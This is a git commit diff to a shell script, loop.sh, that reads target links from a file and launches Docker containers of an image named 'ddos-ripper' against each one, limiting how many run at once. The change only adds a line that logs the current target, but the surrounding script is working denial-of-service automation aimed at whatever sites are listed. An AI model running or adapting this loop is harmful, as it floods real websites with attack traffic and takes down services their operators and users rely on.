488ad9819ee26fa7669605cd4ce085c0826fa1a3
Pavlo Shalahai <pavel.shalahai@iongroup.com>
2022-03-02 14:35:01 +0200

    Logging links which are attacking.

--- loop.sh
+++ loop.sh
@@ -9,6 +9,7 @@ while read link; do
     while [ $(sudo docker ps | wc -l) -gt 4 ]; do
         sleep 60
     done
+    echo "Current target is $link"
     sudo docker stop -t $1 $(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest "$link") &
     sleep 5
 done </tmp/links.txt
